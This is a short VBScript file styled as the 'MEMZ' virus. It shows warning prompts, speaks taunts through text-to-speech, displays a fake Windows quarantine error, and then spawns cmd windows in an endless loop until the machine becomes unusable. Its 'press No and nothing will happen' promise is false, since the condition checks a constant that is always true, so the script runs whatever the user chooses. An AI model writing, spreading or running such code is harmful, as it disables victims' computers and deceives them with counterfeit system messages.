x = MsgBox ("The software you just executed is considerend malware." &vblf& "This malware will harm your computer and makes it unusable." &vblf& "If you are seeing this message without knowing what you" &vblf& "just executed, simply press No and nothing will happen." &vblf& "If you know what this malware does and are using a safe" &vblf& "environment to test, press Yes to start it." &vblf& " " &vblf& "DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN" &vblf& "UNUSABLE MACHINE?" ,48+vbYesNo, "MEMZ")
if vbYes Then
x = MsgBox ("THIS IS THE LAST WARNING!" &vblf& " " &vblf& "THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE" &vblf& "USING THIS MALWARE!" &vblf& "STILL EXECUTE IT?" ,48+vbYesNo, "MEMZ")
End If
if vbYes Then
set WshShell = Wscript.createObject("WScript.Shell")
                WshShell.Run "cmd"
                WScript.Sleep 1000
                WshShell.SendKeys "%+{f4}"
                
End If

WScript.Sleep 1000
set speechobject = createobject("sapi.spvoice")
speechobject.speak "YOUR COMPUTER IS HACKED BY MEMZ VIRUS"
speechobject.speak "I CAN SEE YOUR MONITOR"
WScript.Sleep 1000
x = MsgBox ("LOL" ,48,"MEMZ")

x = MsgBox ("Get ready." ,48,"MEMZ")
x = MsgBox ("Get ready.." ,48,"MEMZ")
set speechobject = createObject("sapi.spvoice")
speechobject.speak "Goodbye"
WScript.Sleep 2500
x = MsgBox ("Your PC ran into a critical problem and needs to quarantine. We're" &vblf& "just collecting some error info, and then we'll restart for" &vblf& "you." ,0+16+4096,  "Windows")
WScript.Sleep 5000
x = MsgBox ("Quarantine failed please try again later." ,0+16+4096, "Windows Error")

Do
set WshShell = Wscript.CreateObject("WScript.Shell")
WshShell.Run "cmd"
Loop
